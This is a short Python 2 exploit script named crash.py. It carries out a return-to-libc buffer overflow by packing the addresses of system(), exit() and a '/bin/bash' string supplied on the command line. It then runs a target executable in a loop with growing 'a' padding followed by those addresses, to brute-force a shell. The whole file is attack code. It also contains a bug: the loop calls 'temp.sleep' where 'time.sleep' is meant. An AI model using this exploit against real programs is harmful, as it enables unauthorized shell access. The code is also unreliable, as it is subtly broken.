#!/usr/bin/python

import os
import sys
import time
import struct

if len(sys.argv) != 5 :
    print "Usage: $python crash.py <executable_name> <address_system> <address_exit> <address_/bin/bash> "
    sys.exit(1);


#i = 40
#while True :
#    command = "./"+ sys.argv[1] + " " + "a" * i
 #   os.system(command)
  #  print "NUmber of 'a's = " + str(i) + "\n"
   # time.sleep(0.25)
    #i = i + 1

location_bash = struct.pack('<L' , int(str(sys.argv[4]) , 16));
location_exit = struct.pack('<L' , int(str(sys.argv[3]) , 16));
location_system = struct.pack('<L', int(str(sys.argv[2]) , 16  ));

print location_system+location_exit+location_bash

i = 40
while True:
    command = r"./" + sys.argv[1] + " " + "a" * i + location_system + location_exit + location_bash
    os.system(command)
    temp.sleep(0.20)
    i = i + 1
